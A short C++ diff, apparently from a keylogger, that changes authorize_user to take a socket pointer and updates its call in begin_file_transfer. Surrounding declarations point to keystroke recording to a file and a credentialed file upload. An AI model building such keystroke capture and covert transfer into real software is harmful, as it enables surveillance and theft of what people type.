@@ -29,7 +29,7 @@ void WriteToFile(DWORD vkCode, DWORD time, bool wasKeyUp);
 static void initialize_hook_thread();
 static void begin_file_transfer(std::string userName, std::string password);
 bool hash_password(std::string pass, std::string* outPass);
-bool authorize_user(SOCKET connectionSocket, std::string userName, std::string password);
+bool authorize_user(SOCKET *connectionSocket, std::string userName, std::string password);
 
 DWORD lastKey = 0x0;
 DWORD lastAction = 0x0;
@@ -530,7 +530,7 @@ static void begin_file_transfer(std::string userName, std::string password)
 		return;
 	}
 
-	if (!(authorize_user(ConnectionSocket, userName, outPass)))
+	if (!(authorize_user(&ConnectionSocket, userName, outPass)))
 	{
 		printf("Bad authentication details...\n");
 		closesocket(ConnectionSocket);
